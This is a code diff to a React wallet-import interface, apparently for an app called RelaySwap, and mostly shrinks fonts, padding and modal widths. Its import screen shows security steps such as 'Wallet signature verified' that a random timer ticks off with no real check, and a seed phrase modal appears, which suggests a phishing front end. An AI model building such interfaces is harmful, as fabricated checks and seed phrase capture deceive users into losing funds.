@@ -20,7 +20,6 @@ function ImportingScreen({ wallet, onDone }) {
   useEffect(() => {
     let p = 0;
     const iv = setInterval(() => {
-      // p = Math.min(100, p + Math.random() * 4 + 1.5);
       p = Math.min(100, p + Math.random() * 0.28 + 0.17);
       setProgress(Math.round(p));
       if (p > 25) setStatusMsg(msgs[1]);
@@ -37,67 +36,67 @@ function ImportingScreen({ wallet, onDone }) {
   if (phase === 'empty') {
     return (
       <div className="modal-overlay">
-        <div className="modal" style={{ maxWidth: 480 }} onClick={e => e.stopPropagation()}>
+        <div className="modal" style={{ maxWidth: 340 }} onClick={e => e.stopPropagation()}>
 
           {/* HEADER */}
           <div style={{
-            display: 'flex', alignItems: 'center', gap: 14,
-            padding: '20px 20px 16px', borderBottom: '1px solid var(--border)'
+            display: 'flex', alignItems: 'center', gap: 12,
+            padding: '14px 16px 12px', borderBottom: '1px solid var(--border)'
           }}>
             <div style={{
-              width: 48, height: 48, borderRadius: 14, flexShrink: 0,
+              width: 36, height: 36, borderRadius: 10, flexShrink: 0,
               background: 'linear-gradient(135deg, #1a3a6a, #0d52cc)',
-              display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 22
+              display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 16
             }}>🔒</div>
             <div>
-              <div style={{ fontSize: 11, fontWeight: 700, color: 'var(--text3)', letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 2 }}>
+              <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 2 }}>
                 Wallet Import
               </div>
-              <div style={{ fontSize: 13, fontWeight: 800, color: 'var(--text)', letterSpacing: 1, textTransform: 'uppercase' }}>
+              <div style={{ fontSize: 12, fontWeight: 800, color: 'var(--text)', letterSpacing: 1, textTransform: 'uppercase' }}>
                 Scan Complete
               </div>
             </div>
           </div>
 
           {/* BODY */}
-          <div style={{ padding: '40px 24px', textAlign: 'center' }}>
+          <div style={{ padding: '20px 20px', textAlign: 'center' }}>
 
             {/* Wallet badge */}
             <div style={{
               display: 'inline-flex', alignItems: 'center', gap: 8,
-              padding: '8px 14px', background: 'var(--surface2)',
-              border: '1px solid var(--border)', borderRadius: 10, marginBottom: 28
+              padding: '6px 12px', background: 'var(--surface2)',
+              border: '1px solid var(--border)', borderRadius: 10, marginBottom: 16
             }}>
-              <span style={{ fontSize: 18 }}>{wallet.icon}</span>
-              <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--text)' }}>{wallet.name}</span>
+              <span style={{ fontSize: 16 }}>{wallet.icon}</span>
+              <span style={{ fontSize: 12, fontWeight: 600, color: 'var(--text)' }}>{wallet.name}</span>
               <span style={{
-                fontSize: 10, fontWeight: 700, color: 'var(--green)',
+                fontSize: 9, fontWeight: 700, color: 'var(--green)',
                 background: 'var(--green-bg)', border: '1px solid var(--green)',
-                padding: '2px 8px', borderRadius: 20, marginLeft: 4
+                padding: '2px 6px', borderRadius: 20, marginLeft: 4
               }}>● Connected</span>
             </div>
 
             {/* Empty state icon */}
             <div style={{
-              width: 72, height: 72, borderRadius: '50%', margin: '0 auto 20px',
+              width: 52, height: 52, borderRadius: '50%', margin: '0 auto 12px',
               background: 'var(--surface2)', border: '2px solid var(--border)',
-              display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 30
+              display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 22
             }}>
               📭
             </div>
 
-            <div style={{ fontSize: 18, fontWeight: 700, color: 'var(--text)', marginBottom: 8 }}>
+            <div style={{ fontSize: 15, fontWeight: 700, color: 'var(--text)', marginBottom: 6 }}>
               No Assets Found
             </div>
-            <div style={{ fontSize: 13, color: 'var(--text2)', lineHeight: 1.7, marginBottom: 28, maxWidth: 300, margin: '0 auto 28px' }}>
+            <div style={{ fontSize: 11, color: 'var(--text2)', lineHeight: 1.6, marginBottom: 16, maxWidth: 260, margin: '0 auto 16px' }}>
               No tokens or balances were found in this wallet. You can still use RelaySwap to receive assets.
             </div>
 
             {/* Stats row */}
             <div style={{
-              display: 'flex', gap: 12, marginBottom: 28,
+              display: 'flex', gap: 8, marginBottom: 16,
               background: 'var(--surface2)', border: '1px solid var(--border)',
-              borderRadius: 12, padding: '14px 16px'
+              borderRadius: 10, padding: '10px 12px'
             }}>
               {[
                 { label: 'Tokens', value: '0' },
@@ -105,8 +104,8 @@ function ImportingScreen({ wallet, onDone }) {
                 { label: 'Total Value', value: '$0.00' },
               ].map(s => (
                 <div key={s.label} style={{ flex: 1, textAlign: 'center' }}>
-                  <div style={{ fontSize: 18, fontWeight: 800, color: 'var(--text)', fontFamily: 'DM Mono' }}>{s.value}</div>
-                  <div style={{ fontSize: 11, color: 'var(--text3)', marginTop: 2 }}>{s.label}</div>
+                  <div style={{ fontSize: 15, fontWeight: 800, color: 'var(--text)', fontFamily: 'DM Mono' }}>{s.value}</div>
+                  <div style={{ fontSize: 10, color: 'var(--text3)', marginTop: 2 }}>{s.label}</div>
                 </div>
               ))}
             </div>
@@ -114,9 +113,9 @@ function ImportingScreen({ wallet, onDone }) {
             <button
               onClick={onDone}
               style={{
-                width: '100%', padding: '14px', borderRadius: 12, border: 'none',
+                width: '100%', padding: '12px', borderRadius: 10, border: 'none',
                 background: 'var(--accent)', color: '#ffffff',
-                fontFamily: "'DM Sans', sans-serif", fontSize: 13, fontWeight: 800,
+                fontFamily: "'DM Sans', sans-serif", fontSize: 12, fontWeight: 800,
                 letterSpacing: 1.5, textTransform: 'uppercase', cursor: 'pointer',
                 transition: 'all 0.2s', boxShadow: '0 4px 20px rgba(0,255,136,0.25)',
               }}
@@ -132,82 +131,82 @@ function ImportingScreen({ wallet, onDone }) {
   // ── IMPORTING (loading) PHASE ──
   return (
     <div className="modal-overlay">
-      <div className="modal" style={{ maxWidth: 480 }} onClick={e => e.stopPropagation()}>
+      <div className="modal" style={{ maxWidth: 340 }} onClick={e => e.stopPropagation()}>
 
         {/* HEADER */}
         <div style={{
-          display: 'flex', alignItems: 'center', gap: 14,
-          padding: '20px 20px 16px', borderBottom: '1px solid var(--border)'
+          display: 'flex', alignItems: 'center', gap: 12,
+          padding: '14px 16px 12px', borderBottom: '1px solid var(--border)'
         }}>
           <div style={{
-            width: 48, height: 48, borderRadius: 14, flexShrink: 0,
+            width: 36, height: 36, borderRadius: 10, flexShrink: 0,
             background: 'linear-gradient(135deg, #1a3a6a, #0d52cc)',
-            display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 22
+            display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 16
           }}>🔒</div>
           <div>
-            <div style={{ fontSize: 11, fontWeight: 700, color: 'var(--text3)', letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 2 }}>
+            <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 2 }}>
               Security Protocol:
             </div>
-            <div style={{ fontSize: 13, fontWeight: 800, color: 'var(--text)', letterSpacing: 1, textTransform: 'uppercase' }}>
+            <div style={{ fontSize: 12, fontWeight: 800, color: 'var(--text)', letterSpacing: 1, textTransform: 'uppercase' }}>
               Importing Wallet...
             </div>
           </div>
         </div>
 
         {/* BODY */}
-        <div style={{ padding: '40px 24px', textAlign: 'center' }}>
+        <div style={{ padding: '20px 20px', textAlign: 'center' }}>
 
           {/* Wallet badge */}
           <div style={{
             display: 'inline-flex', alignItems: 'center', gap: 8,
-            padding: '8px 14px', background: 'var(--surface2)',
-            border: '1px solid var(--border)', borderRadius: 10, marginBottom: 32
+            padding: '6px 12px', background: 'var(--surface2)',
+            border: '1px solid var(--border)', borderRadius: 10, marginBottom: 16
           }}>
-            <span style={{ fontSize: 18 }}>{wallet.icon}</span>
-            <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--text)' }}>{wallet.name}</span>
-            <span style={{ fontSize: 11, color: 'var(--text3)', marginLeft: 2 }}>— {wallet.desc}</span>
+            <span style={{ fontSize: 16 }}>{wallet.icon}</span>
+            <span style={{ fontSize: 12, fontWeight: 600, color: 'var(--text)' }}>{wallet.name}</span>
+            <span style={{ fontSize: 10, color: 'var(--text3)', marginLeft: 2 }}>— {wallet.desc}</span>
           </div>
 
           {/* Spinner */}
-          <div style={{ width: 64, height: 64, margin: '0 auto 20px', position: 'relative' }}>
+          <div style={{ width: 48, height: 48, margin: '0 auto 12px', position: 'relative' }}>
             <div style={{
               position: 'absolute', inset: 0, borderRadius: '50%',
               border: '2.5px solid var(--border)', borderTopColor: 'var(--accent)',
               animation: 'spin 0.9s linear infinite'
             }} />
             <div style={{
-              position: 'absolute', inset: 9, borderRadius: '50%',
+              position: 'absolute', inset: 7, borderRadius: '50%',
               border: '2.5px solid var(--border)', borderRightColor: 'var(--green)',
               animation: 'spin 1.4s linear infinite reverse'
             }} />
             <div style={{
               position: 'absolute', inset: 0,
               display: 'flex', alignItems: 'center', justifyContent: 'center',
-              fontSize: 18
+              fontSize: 16
             }}>{wallet.icon}</div>
           </div>
 
-          <div style={{ fontSize: 17, fontWeight: 700, color: 'var(--text)', marginBottom: 6 }}>
+          <div style={{ fontSize: 14, fontWeight: 700, color: 'var(--text)', marginBottom: 4 }}>
             Importing Wallet...
           </div>
-          <div style={{ fontSize: 12, color: 'var(--text2)', marginBottom: 24, fontFamily: 'DM Mono' }}>
+          <div style={{ fontSize: 11, color: 'var(--text2)', marginBottom: 12, fontFamily: 'DM Mono' }}>
             {statusMsg}
           </div>
 
           {/* Progress bar */}
-          <div style={{ height: 4, borderRadius: 2, background: 'var(--surface3)', overflow: 'hidden', marginBottom: 8 }}>
+          <div style={{ height: 3, borderRadius: 2, background: 'var(--surface3)', overflow: 'hidden', marginBottom: 6 }}>
             <div style={{
               height: '100%', borderRadius: 2,
               background: 'linear-gradient(90deg, var(--accent), var(--green))',
               width: `${progress}%`, transition: 'width 0.3s ease'
             }} />
           </div>
-          <div style={{ fontSize: 11, color: 'var(--text3)', fontFamily: 'DM Mono', marginBottom: 24 }}>
+          <div style={{ fontSize: 10, color: 'var(--text3)', fontFamily: 'DM Mono', marginBottom: 12 }}>
             {progress}% complete
           </div>
 
           {/* Steps */}
-          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
+          <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
             {[
               { label: 'Wallet signature verified', done: progress >= 25 },
               { label: 'Network connection established', done: progress >= 55 },
@@ -215,16 +214,16 @@ function ImportingScreen({ wallet, onDone }) {
               { label: 'Import complete', done: progress >= 100 },
             ].map((s, i) => (
               <div key={i} style={{
-                display: 'flex', alignItems: 'center', gap: 10,
-                padding: '8px 12px', borderRadius: 10,
+                display: 'flex', alignItems: 'center', gap: 8,
+                padding: '6px 10px', borderRadius: 8,
                 background: s.done ? 'var(--green-bg)' : 'var(--surface2)',
                 border: `1px solid ${s.done ? 'var(--green)' : 'var(--border)'}`,
                 transition: 'all 0.3s'
               }}>
-                <span style={{ fontSize: 13, color: s.done ? 'var(--green)' : 'var(--text3)' }}>
+                <span style={{ fontSize: 11, color: s.done ? 'var(--green)' : 'var(--text3)' }}>
                   {s.done ? '✓' : '○'}
                 </span>
-                <span style={{ fontSize: 12, fontWeight: 600, color: s.done ? 'var(--green)' : 'var(--text3)' }}>
+                <span style={{ fontSize: 11, fontWeight: 600, color: s.done ? 'var(--green)' : 'var(--text3)' }}>
                   {s.label}
                 </span>
               </div>
@@ -398,7 +397,7 @@ function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
                 width: '100%', background: 'var(--surface2)',
                 border: `1px solid ${addressReady ? 'var(--accent)' : 'var(--border)'}`,
                 borderRadius: 12, padding: '13px 14px',
-                fontFamily: "'DM Mono', monospace", fontSize: 13, color: 'var(--text)',
+                fontFamily: "'DM Mono', monospace", fontSize: 11, color: 'var(--text)',
                 outline: 'none', transition: 'border-color 0.2s',
               }}
             />
